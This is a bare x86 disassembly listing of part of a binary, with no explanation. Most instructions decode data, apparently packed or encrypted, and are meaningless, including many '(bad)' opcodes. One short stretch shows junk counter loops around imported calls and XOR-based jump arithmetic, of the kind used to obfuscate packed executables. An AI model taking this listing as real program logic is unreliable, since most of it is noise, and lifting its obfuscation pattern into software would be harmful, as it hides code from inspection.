  4030cb:	leave  
  4030cc:	sahf   
  4030cd:	pop    esi
  4030ce:	call   0x80f1b858
  4030d3:	test   DWORD PTR [esi],eax
  4030d5:	rcl    DWORD PTR [ecx+0x71393238],1
  4030db:	repnz shr BYTE PTR ds:0xec43891c,0xa9
  4030e3:	inc    edx
  4030e4:	aad    0x43
  4030e6:	or     al,0x6b
  4030e8:	sub    ch,BYTE PTR [ebp-0x40]
  4030eb:	cmp    ecx,DWORD PTR [ebx-0x5]
  4030ee:	outs   dx,BYTE PTR ds:[esi]
  4030ef:	jmp    0xa6de:0xbadc0b51
  4030f6:	push   eax
  4030f7:	push   ecx
  4030f8:	xor    al,0xf5
  4030fa:	imul   ecx,DWORD PTR [ecx-0x77f5712e],0xa
  403101:	cmp    eax,0x960e64bd
  403106:	push   0x61aebeb9
  40310b:	(bad)  
  40310c:	sub    ecx,edi
  40310e:	fwait
  40310f:	adc    ebp,DWORD PTR [ebp+edx*8-0x25]
  403113:	(bad)  
  403114:	mov    cl,ch
  403116:	in     eax,dx
  403117:	mov    ebp,0xf5da6483
  40311c:	rcr    DWORD PTR [edi-0x26],cl
  40311f:	add    eax,0xe59367c
  403124:	and    cl,BYTE PTR [ebx]
  403126:	(bad)  
  403127:	daa    
  403128:	ja     0x4030ec
  40312a:	ins    DWORD PTR es:[edi],dx
  40312b:	es scas eax,DWORD PTR es:[edi]
  40312d:	icebp  
  40312e:	adc    BYTE PTR [eax-0x37f8fac1],al
  403134:	lahf   
  403135:	sbb    edi,DWORD PTR [edx+ebx*4]
  403138:	cmc    
  403139:	mov    edi,DWORD PTR [ebx+0x5db0dcbd]
  40313f:	dec    BYTE PTR [ebx-0x840e58f]
  403145:	pusha  
  403146:	push   eax
  403147:	shl    DWORD PTR [ebx+0x17],0x7c
  40314b:	jge    0x4030e9
  40314d:	sahf   
  40314e:	push   esi
  40314f:	mov    al,ds:0xa23db758
  403154:	and    dh,cl
  403156:	pop    ebp
  403157:	mov    ds:0x90e55d95,al
  40315c:	sub    eax,0xcae5fafe
  403161:	add    eax,0xf18b954b
  403166:	test   ah,0xf5
  403169:	jnp    0x4031e7
  40316b:	fdiv   QWORD PTR [esi-0x21]
  40316e:	int    0x7a
  403170:	dec    eax
  403171:	xchg   edx,eax
  403172:	clc    
  403173:	push   ebp
  403174:	xchg   ebp,eax
  403175:	jne    0x4031c4
  403177:	call   0x44fb:0x7dbefcf7
  40317e:	mov    ecx,0x855940ef
  403183:	mov    ch,0x6d
  403185:	cdq    
  403186:	lahf   
  403187:	cmp    eax,0xc6efa4f7
  40318c:	icebp  
  40318d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40318e:	(bad)  
  40318f:	ss cwde 
  403191:	out    0xff,al
  403193:	push   edi
  403194:	test   al,0x2d
  403196:	fcmovnbe st,st(4)
  403198:	popa   
  403199:	lock imul BYTE PTR [ebp-0x5f]
  40319d:	xor    DWORD PTR [ebp+0x6d],edx
  4031a0:	sbb    al,0x97
  4031a2:	push   esp
  4031a3:	gs jbe 0x4031c3
  4031a6:	sbb    bh,BYTE PTR [eax+eax*2-0x733914bc]
  4031ad:	inc    esp
  4031ae:	cmp    BYTE PTR [ebx],ah
  4031b0:	mov    al,ds:0xb6ef0fa0
  4031b5:	inc    eax
  4031b6:	mov    ecx,0xd9ba00e
  4031bb:	sub    dl,dl
  4031bd:	mov    ds:0xab7f5e16,al
  4031c2:	clc    
  4031c3:	adc    BYTE PTR [edx-0x2c4023db],ch
  4031c9:	out    dx,al
  4031ca:	sbb    BYTE PTR [esi+0x1a],al
  4031cd:	fdivr  st,st(5)
  4031cf:	daa    
  4031d0:	aam    0x92
  4031d2:	pop    eax
  4031d3:	mov    al,0x6c
  4031d5:	push   ebx
  4031d6:	addr16 into 
  4031d8:	ret    0x6521
  4031db:	outs   dx,BYTE PTR ds:[esi]
  4031dc:	test   BYTE PTR [eax+0x5ffdb8c0],bh
  4031e2:	mov    bl,0xbe
  4031e4:	dec    ebx
  4031e5:	push   ecx
  4031e6:	sbb    BYTE PTR [ecx-0x28a47d2],al
  4031ec:	mov    ah,0xcc
  4031ee:	call   0xef63:0xc9aeab7b
  4031f5:	arpl   WORD PTR [esp+ebp*1+0x66],dx
  4031f9:	fst    QWORD PTR [ebx+0x15]
  4031fc:	mov    ebx,DWORD PTR [edi-0x755a6a4f]
  403202:	inc    eax
  403203:	xlat   BYTE PTR ds:[ebx]
  403204:	rcr    BYTE PTR [ebx+0x41d6ab9d],1
  40320a:	iret   
  40320b:	cld    
  40320c:	sbb    DWORD PTR [edi],ebx
  40320e:	sti    
  40320f:	inc    ebp
  403210:	sbb    eax,DWORD PTR [edx]
  403212:	add    bl,BYTE PTR [eax+eiz*4]
  403215:	sbb    BYTE PTR [esi+0x64],bl
  403218:	fldcw  WORD PTR [ebp-0x5cdfa36f]
  40321e:	jmp    0x45777603
  403223:	xchg   ebp,ecx
  403225:	test   DWORD PTR [edx+0x61b1c380],eax
  40322b:	jmp    0x1902:0xd14816b6
  403232:	lahf   
  403233:	mov    edx,0xb7102917
  403238:	div    DWORD PTR [eax-0x14]
  40323b:	call   0x5bc2:0xa4ea06cd
  403242:	lea    ebp,[ebx-0x288252c9]
  403248:	ror    BYTE PTR [ecx-0x16],0x61
  40324c:	pop    ecx
  40324d:	enter  0xe611,0x2f
  403251:	cld    
  403252:	lock stos DWORD PTR es:[edi],eax
  403254:	push   ss
  403255:	outs   dx,BYTE PTR ds:[esi]
  403256:	xor    BYTE PTR [edi-0x40bde7ba],bl
  40325c:	in     al,0x4d
  40325e:	jno    0x403216
  403260:	add    BYTE PTR [ecx-0x32],ah
  403263:	mov    ebx,cs
  403265:	adc    DWORD PTR [edx-0x34],ecx
  403268:	repz push ebp
  40326a:	dec    ebp
  40326b:	stc    
  40326c:	xchg   edi,eax
  40326d:	(bad)  [edi]
  40326f:	or     al,0x5c
  403271:	push   ecx
  403272:	jnp    0x40320c
  403274:	fsub   DWORD PTR [edi+ecx*1-0x5a]
  403278:	jns    0x4032e0
  40327a:	test   eax,0xc984ca4c
  40327f:	mov    dl,0x81
  403281:	pop    ebx
  403282:	leave  
  403283:	ret    0xc
  403286:	push   ebp
  403287:	mov    ebp,esp
  403289:	sub    esp,0x14
  40328c:	leave  
  40328d:	ret    0x4
  403290:	push   ebp
  403291:	mov    ebp,esp
  403293:	push   ecx
  403294:	push   ecx
  403295:	neg    ecx
  403297:	mov    eax,0xf89c8535
  40329c:	and    DWORD PTR ds:0x433717,0x0
  4032a6:	mov    edx,DWORD PTR ds:0x433717
  4032ac:	inc    edx
  4032ad:	mov    DWORD PTR ds:0x433717,edx
  4032b3:	cmp    DWORD PTR ds:0x433717,0x6
  4032ba:	jne    0x4032d5
  4032c0:	push   0x8ffb
  4032c5:	push   0x6662
  4032ca:	push   0x4337ed
  4032cf:	call   DWORD PTR ds:0x412180
  4032d5:	cmp    DWORD PTR ds:0x433717,0x5
  4032dc:	jne    0x4032ef
  4032e2:	mov    edx,DWORD PTR ds:0x433717
  4032e8:	inc    edx
  4032e9:	mov    DWORD PTR ds:0x433717,edx
  4032ef:	cmp    DWORD PTR ds:0x433717,0x11
  4032f6:	jb     0x4032a6
  4032fc:	mov    DWORD PTR [ebp-0x8],eax
  4032ff:	sbb    DWORD PTR ds:0x43369b,edi
  403305:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40330c:	mov    DWORD PTR ds:0x43375b,0x7030
  403316:	mov    edx,DWORD PTR [ebp-0x8]
  403319:	and    DWORD PTR ds:0x4336f3,0x0
  403323:	xor    ecx,ecx
  403325:	or     ecx,DWORD PTR ds:0x4336f3
  40332b:	inc    ecx
  40332c:	mov    DWORD PTR ds:0x4336f3,ecx
  403332:	cmp    DWORD PTR ds:0x4336f3,0x1f
  403339:	jne    0x403361
  40333f:	push   0x433757
  403344:	push   0x433723
  403349:	push   DWORD PTR [ebp-0xc]
  40334c:	push   0x4338cc
  403351:	push   0x4337ca
  403356:	push   0x433867
  40335b:	call   DWORD PTR ds:0x412184
  403361:	cmp    DWORD PTR ds:0x4336f3,0x13
  403368:	jb     0x403323
  40336e:	mov    DWORD PTR ds:0x43365b,0x1f
  403378:	cmp    DWORD PTR ds:0x43365b,0x0
  40337f:	je     0x4033d1
  403385:	cmp    DWORD PTR ds:0x43365b,0x4
  40338c:	jne    0x40339d
  403392:	push   0x4336eb
  403397:	call   DWORD PTR ds:0x412188
  40339d:	cmp    DWORD PTR ds:0x43365b,0x5
  4033a4:	jne    0x4033b9
  4033aa:	xor    ecx,ecx
  4033ac:	xor    ecx,DWORD PTR ds:0x43365b
  4033b2:	dec    ecx
  4033b3:	mov    DWORD PTR ds:0x43365b,ecx
  4033b9:	mov    ecx,DWORD PTR ds:0x43365b
  4033bf:	dec    ecx
  4033c0:	mov    DWORD PTR ds:0x43365b,ecx
  4033c6:	jmp    0x403378
  4033cb:	and    DWORD PTR ds:0x4336e3,ecx
  4033d1:	push   esi
  4033d2:	mov    ecx,0x7510853
  4033d7:	xor    edx,ecx
  4033d9:	mov    esi,0x32729a
  4033de:	adc    DWORD PTR ds:0x43372b,0x4fea
  4033e8:	push   edi
  4033e9:	sub    DWORD PTR ds:0x4336db,0x417a
  4033f3:	mov    edi,DWORD PTR [ebp+0x10]
  4033f6:	add    edx,esi
  4033f8:	cmp    edi,edx
  4033fa:	je     0x403eaf
  403400:	jmp    0x40360c
  403405:	adc    DWORD PTR [edi+0x6fb6ef04],esp
  40340b:	icebp  
  40340c:	popa   
  40340d:	mov    WORD PTR [ebx],?
  40340f:	push   edi
  403410:	inc    esp
  403411:	ja     0x40348e
  403413:	call   0x6d7c:0x7c1316bc
  40341a:	jg     0x403498
  40341c:	jl     0x40348b
  40341e:	stc    
  40341f:	push   edi
  403420:	adc    eax,0xa79c334e
  403425:	(bad)  
  403426:	jge    0x4033d7
  403428:	jg     0x4033f7
  40342a:	je     0x403457
  40342c:	fnstenv [ebx+esi*2+0x19e512db]
  403433:	jmp    0x442c4342
  403438:	nop
  403439:	sub    ah,BYTE PTR [edx-0x4cdd3d70]
  40343f:	mov    ebx,0x8fa4e37f
  403444:	in     eax,dx
  403445:	pop    ebx
  403446:	scas   al,BYTE PTR es:[edi]
  403447:	push   edx
  403448:	mov    ds:0xdc37afae,eax
  40344d:	lahf   
  40344e:	xchg   edx,eax
  40344f:	mov    al,0xfc
  403451:	cwde   
  403452:	mov    dh,0xb5
  403454:	cmp    DWORD PTR [esp+esi*2+0x3f],esp
  403458:	jb     0x4034c6
  40345a:	sbb    DWORD PTR [edx*2+0x6792c0b5],eax
  403461:	or     al,BYTE PTR [ecx]
  403463:	cmp    DWORD PTR [esi-0x36],edx
  403466:	cdq    
  403467:	rcr    DWORD PTR [ecx-0x2d],cl
  40346a:	pop    DWORD PTR [eax]
  40346c:	push   0x2
  40346e:	ins    BYTE PTR es:[edi],dx
  40346f:	bound  edx,QWORD PTR [ebx+0x5e]
  403472:	(bad)  
  403473:	xor    DWORD PTR [ecx],esi
  403475:	idiv   DWORD PTR [esi+0x1dacdac8]
  40347b:	jb     0x403459
  40347d:	out    dx,eax
  40347e:	icebp  
  40347f:	fidivr WORD PTR [ebp-0x24]
  403482:	(bad)  
  403483:	jg     0x40345d
  403485:	mov    ah,0xb2
  403487:	pop    edi
  403488:	sbb    eax,0x4c
  40348b:	mov    ah,0xca
  40348d:	mov    ebx,0xacf4dee8
  403492:	dec    edx
  403493:	std    
  403494:	mov    al,0xc3
  403496:	(bad)  
  403498:	ja     0x403482
  40349a:	cmp    esp,DWORD PTR [ebx]
  40349c:	fadd   st,st(1)
  40349e:	fdivr  DWORD PTR [eax-0x239fbd6d]
  4034a4:	in     eax,dx
  4034a5:	dec    ebx
  4034a6:	outs   dx,BYTE PTR ds:[esi]
  4034a7:	mov    dl,0xdc
  4034a9:	or     al,0xf
  4034ab:	fdivr  DWORD PTR [ebx+eiz*2+0x71]
  4034af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b0:	call   0x8e53:0x3e1db97a
  4034b7:	sub    BYTE PTR [eax+0x476837ac],dh
  4034bd:	fwait
  4034be:	ds jmp 0x403511
  4034c1:	jb     0x403480
  4034c3:	daa    
  4034c4:	xchg   edi,eax
  4034c5:	xor    al,0x9c
  4034c7:	push   cs
  4034c8:	jne    0x40347b
  4034ca:	adc    dh,BYTE PTR [edx-0x3c]
  4034cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034cf:	dec    ebx
  4034d0:	cmp    ebp,DWORD PTR [eax]
  4034d2:	mov    al,ds:0x63f02c51
  4034d7:	or     DWORD PTR [esp+eax*4+0x573debd7],ebx
  4034de:	add    al,0x77
  4034e0:	jns    0x403500
  4034e2:	xchg   edi,eax
  4034e3:	sub    edi,DWORD PTR [ebx]
  4034e5:	mov    eax,0x417b2292
  4034ea:	mov    esp,?
  4034ec:	pop    es
  4034ed:	add    eax,0xe1d587d2
  4034f2:	or     eax,0xda794686
  4034f7:	jnp    0x40355a
  4034f9:	adc    esp,edi
  4034fb:	daa    
  4034fc:	add    bh,BYTE PTR [edi-0x3]
  4034ff:	cld    
  403500:	out    0x8b,eax
  403502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403503:	sbb    eax,0xc83dd347
  403508:	xor    BYTE PTR [ebx-0x1d9c69ad],al
  40350e:	int3   
  40350f:	sub    al,BYTE PTR [esi+0x4a]
  403512:	dec    ebx
  403513:	fwait
  403514:	es add eax,0xa038b73b
  40351a:	sbb    ch,bl
  40351c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40351d:	rcl    BYTE PTR [esp+ebp*1-0xb9bba05],cl
  403524:	jmp    0x900f08de
  403529:	data16 (bad) 
  40352b:	mov    dh,0x43
  40352d:	xchg   edx,eax
  40352e:	cmp    bl,BYTE PTR [edi-0x3b]
  403531:	cmc    
  403532:	cld    
  403533:	std    
  403534:	cmp    edi,ecx
  403536:	iret   
  403537:	and    BYTE PTR [edx+0x7043f1bd],dh
  40353d:	mov    bh,0x29
  40353f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403540:	xor    eax,0x643b007c
  403545:	out    0x39,eax
  403547:	imul   ebp,DWORD PTR [esi-0x6e11b951],0xffffffcb
  40354e:	or     eax,0x68e0cc50
  403553:	das    
  403554:	in     al,dx
  403555:	pop    edx
  403556:	int    0x42
  403558:	and    BYTE PTR [ecx-0x7c],ch
  40355b:	xchg   ebx,eax
  40355c:	pop    ss
  40355d:	push   edx
  40355e:	push   ss
  40355f:	inc    ecx
  403560:	scas   al,BYTE PTR es:[edi]
  403561:	sahf   
  403562:	ret    
  403563:	mov    al,ds:0x370f6089
  403568:	mov    esp,0x2007febb
  40356d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40356e:	sub    al,0xc
  403570:	jle    0x40350e
  403572:	cwde   
  403573:	jge    0x4035db
  403575:	rcl    BYTE PTR [ebx-0x46],1
  403578:	bound  ebp,QWORD PTR [esi+0x51]
  40357b:	add    ecx,DWORD PTR [ecx+0x37d18658]
  403581:	mov    edx,0x25394d8b
  403586:	jmp    0x403564
  403588:	jmp    0xdacbc165
  40358d:	(bad)  
  40358f:	push   0x3a2f449c
  403594:	daa    
  403595:	aas    
  403596:	pop    ss
  403597:	mov    ebx,0x4260e41b
  40359c:	sbb    BYTE PTR [eax-0x51],dl
  40359f:	cdq    
  4035a0:	out    0x54,al
  4035a2:	pop    esi
  4035a3:	outs   dx,BYTE PTR ds:[esi]
  4035a4:	mov    es,WORD PTR [eax]
  4035a6:	jo     0x4035ec
  4035a8:	lock pop ebx
  4035aa:	cld    
  4035ab:	push   esi
  4035ac:	(bad)  
  4035ad:	mov    eax,0x547bad12
  4035b2:	in     eax,0xb
  4035b4:	inc    eax
  4035b5:	mov    esp,0x85551428
  4035ba:	outs   dx,BYTE PTR ds:[esi]
  4035bb:	push   0xffffffe0
  4035bd:	fidivr WORD PTR [ecx]
  4035bf:	push   edi
  4035c0:	and    eax,0xc22792c4
  4035c5:	loopne 0x4035f2
  4035c7:	ja     0x4035e3
  4035c9:	pop    eax
  4035ca:	mov    cl,0x42
  4035cc:	push   eax
  4035cd:	das    
  4035ce:	sbb    al,0xac
  4035d0:	mov    bh,0x9f
  4035d2:	and    eax,0xa98a659
  4035d7:	xor    DWORD PTR [esi-0x5eeb0481],0xffffffde
  4035de:	retf   0x4668
  4035e1:	add    dl,BYTE PTR [edx+0x1c]
  4035e4:	xor    ah,al
  4035e6:	push   edi
  4035e7:	xchg   edi,eax
  4035e8:	scas   eax,DWORD PTR es:[edi]
  4035e9:	imul   esp,DWORD PTR [ebx+0x33],0x7da03bf1
  4035f0:	or     BYTE PTR [esi+0x72eb00c2],0x5a
  4035f7:	out    0x3b,al
  4035f9:	aaa    
  4035fa:	imul   ebx,DWORD PTR [ebx],0xffffff87
  4035fd:	jmp    0x403642
  4035ff:	out    dx,eax
  403600:	mov    BYTE PTR [ebp+0x13],dh
  403603:	ja     0x40358a
  403605:	jno    0x4035fa
  403607:	int    0x5e
  403609:	js     0x403607
  40360b:	retf   
  40360c:	mov    edx,DWORD PTR [ebp-0x8]
  40360f:	mov    eax,DWORD PTR [ebp-0x4]
  403612:	xor    eax,ecx
  403614:	mov    edi,0xffcd8d66
  403619:	sub    edi,eax
  40361b:	add    edi,DWORD PTR [ebp+0x10]
  40361e:	xor    edx,ecx
  403620:	add    edx,esi
  403622:	cmp    edx,edi
  403624:	ja     0x403eaa
  40362a:	push   ebx
  40362b:	jmp    0x403841
  403630:	mov    esi,0x32729a
  403635:	jmp    0x403841
  40363a:	sbb    dh,BYTE PTR [eax+ebx*8+0x727272b6]
  403641:	mov    al,0x9c
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	call   0x93c03a76
  403649:	push   ebp
  40364a:	pop    es
  40364b:	sbb    eax,0x7f6d7c7c
  403650:	jl     0x4036ce
  403652:	stos   DWORD PTR es:[edi],eax
  403653:	and    DWORD PTR [esp+edx*2-0x3ae02d52],edx
  40365a:	les    ebx,FWORD PTR ds:0x7b651d00
  403660:	cmp    edi,DWORD PTR [ecx-0x7b9a2ff8]
  403666:	mov    ch,0x56
  403668:	cli    
  403669:	nop
  40366a:	call   0x9ac86dfa
  40366f:	je     0x40369e
  403671:	sbb    cl,bl
  403673:	mov    ebp,0x1801a720
  403678:	mov    eax,0xad54d663
  40367d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40367e:	aad    0x1d
  403680:	(bad)  
  403681:	fdivr  QWORD PTR [esi]
  403683:	fild   QWORD PTR [edx+0x2e]
  403686:	outs   dx,DWORD PTR ds:[esi]
  403687:	xor    edi,edx
  403689:	outs   dx,BYTE PTR ds:[esi]
  40368a:	or     ebx,DWORD PTR [eax+0x7f]
  40368d:	dec    ecx
  40368e:	test   eax,0xe161ae10
  403693:	arpl   WORD PTR [ebx],ax
  403695:	dec    esp
  403696:	in     al,0xeb
  403698:	mov    ah,0x52
  40369a:	jmp    0x40361d
  40369c:	sub    ebx,DWORD PTR [bx+di-0x66]
  4036a0:	push   ss
  4036a1:	stos   BYTE PTR es:[edi],al
  4036a2:	sub    al,0xef
  4036a4:	dec    edi
  4036a5:	jae    0x4036fb
  4036a7:	or     ecx,DWORD PTR [ebx+0x48010710]
  4036ad:	adc    al,0xb0
  4036af:	hlt    
  4036b0:	or     bl,BYTE PTR [ebx-0x23]
  4036b3:	mov    DWORD PTR [ebx+edi*2-0x61dcd637],ecx
  4036ba:	dec    edx
  4036bb:	ret    
  4036bc:	in     al,dx
  4036bd:	(bad)  
  4036be:	dec    esp
  4036bf:	push   edi
  4036c0:	xchg   ebx,eax
  4036c1:	call   0x5573:0x6bc5c56f
  4036c8:	enter  0x20b1,0x70
  4036cc:	and    edi,edi
  4036ce:	inc    edi
  4036cf:	xchg   ebp,eax
  4036d0:	out    dx,eax
  4036d1:	test   al,0xee
  4036d3:	retf   0x1a8f
  4036d6:	pop    edx
  4036d7:	inc    edi
  4036d8:	push   cs
  4036d9:	scas   eax,DWORD PTR es:[edi]
  4036da:	mov    cl,0x9d
  4036dc:	aaa    
  4036dd:	mov    eax,ds:0x63ed87d5
  4036e2:	test   BYTE PTR [edi+0x11],dl
  4036e5:	and    BYTE PTR es:[eax],bh
  4036e8:	sar    BYTE PTR fs:[esi],0xdc
  4036ec:	je     0x4036d5
  4036ee:	push   cs
  4036ef:	clc    
  4036f0:	mov    edi,0xb65699c1
  4036f5:	push   eax
  4036f6:	imul   BYTE PTR [esi+0x247b9373]
  4036fc:	popa   
  4036fd:	data16 fs and al,0x45
  403701:	mov    al,0xa6
  403703:	push   edi
  403704:	aaa    
  403705:	daa    
  403706:	loopne 0x4036fc
  403708:	add    BYTE PTR [esp+ebx*8+0x6199aec9],ch
  40370f:	jge    0x403716
  403711:	jno    0x40378a
  403713:	jle    0x4036be
  403715:	popa   
  403716:	les    esp,FWORD PTR [ebx+0x7f]
  403719:	sub    DWORD PTR [eax+0x672e2595],eax
  40371f:	pop    esi
  403720:	fwait
  403721:	pop    ecx
  403722:	add    eax,0x586d4839
  403727:	enter  0x4e14,0xb
  40372b:	sub    cl,BYTE PTR [edx]
  40372d:	ror    DWORD PTR [esi],cl
  40372f:	scas   eax,DWORD PTR es:[edi]
  403730:	pop    eax
  403731:	call   0x4968:0x8291bbf
  403738:	jg     0x40376c
  40373a:	mov    WORD PTR [esi],?
  40373c:	mov    ebp,0xdd19ab30
  403741:	inc    ebx
  403742:	inc    ebp
  403743:	repz adc ch,ch
  403746:	(bad)  
  403747:	pop    ebx
  403748:	or     BYTE PTR [edx-0x17],cl
  40374b:	test   eax,0x59825466
  403750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403751:	and    ebx,eax
  403753:	or     eax,0x37e6b576
  403758:	cmp    eax,0xf4a33a63
  40375d:	xchg   esi,eax
  40375e:	sahf   
  40375f:	aas    
  403760:	cmp    ah,bh
  403762:	adc    DWORD PTR [esi+ebp*4+0x40],edi
  403766:	mov    ebx,0xfa93ef61
  40376b:	inc    ecx
  40376c:	push   ss
  40376d:	xchg   edx,eax
  40376e:	adc    dh,BYTE PTR [esi-0x698b7244]
  403774:	stc    
  403775:	mov    dl,0xce
  403777:	cwde   
  403778:	pop    ss
  403779:	call   0x73de80ba
  40377e:	hlt    
  40377f:	jb     0x4037d7
  403781:	std    
  403782:	push   esi
  403783:	or     dh,ch
  403785:	dec    ebx
  403786:	jne    0x40374b
  403788:	xchg   edx,eax
  403789:	sbb    al,0xd4
  40378b:	mov    dh,0xe8
  40378d:	ficomp DWORD PTR [ecx+0x43]
  403790:	or     dh,bh
  403792:	jne    0x40373c
  403794:	jle    0x4037f3
  403796:	out    dx,al
  403797:	in     al,dx
  403798:	stc    
  403799:	pop    esp
  40379a:	pop    ecx
  40379b:	mov    ah,0x43
  40379d:	out    0x80,al
  40379f:	xchg   ebx,eax
  4037a0:	fcomp  DWORD PTR [ebp+0x773de094]
  4037a6:	and    BYTE PTR ds:0xde198926,ch
  4037ac:	xchg   edx,eax
  4037ad:	fldenv ds:0x581af3ce
  4037b3:	mov    bl,0x96
  4037b5:	mov    dh,0x29
  4037b7:	fs push eax
  4037b9:	lahf   
  4037ba:	mov    ch,0x51
  4037bc:	cwde   
  4037bd:	push   ebx
  4037be:	mov    eax,ds:0x810e0a9
  4037c3:	or     bl,dl
  4037c5:	rcr    DWORD PTR [ebx+0x2a],cl
  4037c8:	push   eax
  4037c9:	pop    ss
  4037ca:	das    
  4037cb:	in     eax,dx
  4037cc:	sub    DWORD PTR [ebp+0x5c9a843],0xffffffd2
  4037d3:	jno    0x4037d4
  4037d5:	inc    eax
  4037d6:	nop
  4037d7:	icebp  
  4037d8:	arpl   WORD PTR [ebx],cx
  4037da:	jg     0x40377e
  4037dc:	mov    edi,0x84d0d5e2
  4037e1:	push   ss
  4037e2:	pop    eax
  4037e3:	outs   dx,BYTE PTR ds:[esi]
  4037e4:	fsubr  DWORD PTR [edi]
  4037e6:	(bad)  
  4037e7:	test   edi,esp
  4037e9:	pop    ebx
  4037ea:	stos   BYTE PTR es:[edi],al
  4037eb:	adc    al,0xc5
  4037ed:	(bad)  
  4037ee:	mov    ch,0x82
  4037f0:	cmp    eax,0x50ffe5e7
  4037f5:	test   eax,0xac171098
  4037fa:	ins    DWORD PTR es:[edi],dx
  4037fb:	fadd   st(7),st
  4037fd:	adc    al,0x64
  4037ff:	popf   
  403800:	jmp    0x4037df
  403802:	imul   ebx,DWORD PTR [ecx],0x29240dfd
  403808:	push   ss
  403809:	xchg   ebx,eax
  40380a:	ss stos DWORD PTR es:[edi],eax
  40380c:	loope  0x403884
  40380e:	jno    0x4037a1
  403810:	xchg   edx,eax
  403811:	scas   al,BYTE PTR es:[edi]
  403812:	push   cs
  403813:	jle    0x403859
  403815:	cmp    BYTE PTR [edi],bl
  403817:	mov    edx,0xbfe77982
  40381c:	aas    
  40381d:	push   edx
  40381e:	inc    edi
  40381f:	ss inc ebp
  403821:	std    
  403822:	gs (bad) 
  403824:	das    
  403825:	adc    DWORD PTR [esi+0x152780c4],0x50
  40382c:	cmp    esi,DWORD PTR [edi+0x0]
  40382f:	imul   esi,DWORD PTR [ebx+eax*2+0x7e41ac78],0xffffff96
  403837:	cmp    bh,BYTE PTR [ebp-0x23f59d36]
  40383d:	gs enter 0x1bfd,0x8b
  403842:	inc    ebp
  403843:	clc    
  403844:	jmp    0x403a50
  403849:	sar    BYTE PTR [esi+0x5d5dd03b],1
  40384f:	sar    DWORD PTR [esi+0x4bfdbe82],cl
  403855:	lahf   
  403856:	xchg   ebp,eax
  403857:	pop    es
  403858:	leave  
  403859:	je     0x403877
  40385b:	jl     0x4038d9
  40385d:	ins    DWORD PTR es:[edi],dx
  40385e:	jg     0x4038dc
  403860:	jl     0x4038e0
  403862:	adc    dl,BYTE PTR ds:0x6a22050b
  403868:	call   0xdfed7412
  40386d:	jne    0x4038dc
  40386f:	or     al,0xa3
  403871:	hlt    
  403872:	pop    edx
  403873:	sysret 
  403875:	arpl   WORD PTR [edi],si
  403877:	push   ebp
  403878:	lods   eax,DWORD PTR ds:[esi]
  403879:	dec    ebp
  40387a:	(bad)  
  40387b:	ins    BYTE PTR es:[edi],dx
  40387c:	(bad)  
  40387d:	fild   DWORD PTR [ecx]
  40387f:	sbb    eax,0xfb23e643
  403884:	push   esi
  403885:	xchg   BYTE PTR [edi+ebx*2+0x72],dh
  403889:	adc    esp,DWORD PTR [ebp-0x77]
  40388c:	pusha  
  40388d:	pop    edx
  40388e:	jno    0x403865
  403890:	xor    eax,0xe398d2b9
  403895:	cmp    eax,0xb36537d
  40389a:	inc    esi
  40389b:	in     al,0x56
  40389d:	jl     0x4038e2
  40389f:	fcmovnu st,st(5)
  4038a1:	xor    BYTE PTR [ebp+0xb],dh
  4038a4:	retf   
  4038a5:	iret   
  4038a6:	push   ebx
  4038a7:	arpl   WORD PTR [ecx],bp
  4038a9:	mov    ebx,0x3b148075
  4038ae:	jnp    0x4038b7
  4038b0:	mov    DWORD PTR [ebx],ebx
  4038b2:	ja     0x403888
  4038b4:	out    0xf0,al
  4038b6:	adc    BYTE PTR [edi],al
  4038b8:	out    dx,al
  4038b9:	test   al,0x7a
  4038bb:	cmc    
  4038bc:	ficom  DWORD PTR [edx+0x61d45928]
  4038c2:	or     ah,al
  4038c4:	xor    ah,0xd6
  4038c7:	addr16 push esi
  4038c9:	inc    esi
  4038ca:	gs jbe 0x403915
  4038cd:	lahf   
  4038ce:	call   0xa05b1b76
  4038d3:	mov    ebx,esi
  4038d5:	icebp  
  4038d6:	cs mov edx,0xf91a7ac1
  4038dc:	fdiv   DWORD PTR [ebp-0x30]
  4038df:	xchg   dx,ax
  4038e1:	mov    BYTE PTR [ebx+eax*1+0x51db2493],bh
  4038e8:	pop    eax
  4038e9:	dec    edi
  4038ea:	fwait
  4038eb:	retf   
  4038ec:	jp     0xa7a869eb
  4038f2:	pop    eax
  4038f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038f4:	cmp    dl,BYTE PTR [esi+0x30]
  4038f7:	push   ebp
  4038f8:	jae    0x403905
  4038fa:	stc    
  4038fb:	icebp  
  4038fc:	jae    0x4038fd
  4038fe:	sahf   
  4038ff:	imul   esi,DWORD PTR [ecx+0xb532135],0x1f1c5d1b
  403909:	ja     0x40398a
  40390b:	in     al,dx
  40390c:	push   esp
  40390d:	or     al,cl
  40390f:	xor    al,0x0
  403911:	and    al,0x13
  403913:	push   edi
  403914:	adc    DWORD PTR [esi+edx*4+0x2f],ecx
  403918:	jp     0x40394f
  40391a:	(bad)
  40391e:	mov    esi,0x8e2505a9
  403923:	jbe    0x403944
  403925:	iret   
  403926:	push   cs
  403927:	sub    bl,dh
  403929:	mov    ebx,0xef0e54c
  40392e:	in     eax,0xfc
  403930:	sti    
  403931:	loopne 0x4039a2
  403933:	scas   al,BYTE PTR es:[edi]
  403934:	push   cs
  403935:	mov    WORD PTR [ebp+0x64cab5b5],es
  40393b:	push   eax
  40393c:	repnz and cl,BYTE PTR ds:0xc6953fe5
  403943:	ror    BYTE PTR [edi],cl
  403945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403946:	mov    eax,0x67a1df8d
  40394b:	fdiv   DWORD PTR [ecx+edx*1]
  40394e:	scas   eax,DWORD PTR es:[edi]
  40394f:	ins    DWORD PTR es:[edi],dx
  403950:	stc    
  403951:	mov    dl,0xfb
  403953:	ret    0x344b
  403956:	dec    esp
  403957:	lds    esp,FWORD PTR [eax-0x64]
  40395a:	xor    eax,0xc2c1c12a
